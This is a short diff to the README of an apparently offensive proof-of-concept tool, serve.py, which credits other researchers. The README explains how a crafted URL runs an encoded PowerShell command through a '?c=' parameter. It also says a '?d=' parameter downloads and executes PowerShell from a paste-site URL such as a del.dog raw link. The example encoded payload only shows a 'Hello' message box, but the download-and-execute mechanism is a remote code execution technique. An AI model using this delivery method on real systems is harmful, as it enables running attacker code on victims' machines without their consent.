@@ -4,6 +4,8 @@ shoutz to yuu/@netspooky and remy/@xen0bit
 usage: `python3 serve.py ip port`
 
 visiting ```http://ip:port/?c=powershell -e QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFAAcgBlAHMAZQBuAHQAYQB0AGkAbwBuAEMAbwByAGUALABQAHIAZQBzAGUAbgB0AGEAdABpAG8AbgBGAHIAYQBtAGUAdwBvAHIAawA7ACAAWwBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBNAGUAcwBzAGEAZwBlAEIAbwB4AF0AOgA6AFMAaABvAHcAKAAnAEgAZQBsAGwAbwAnACkA```
+
+
 visiting ```http://ip:port/?d=https://del.dog/raw/imenivexos``` will download and execute powershell using the URL you supply, from pastebin etc, specify raw url's
 
 example commands will execute `Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show('Hello')`
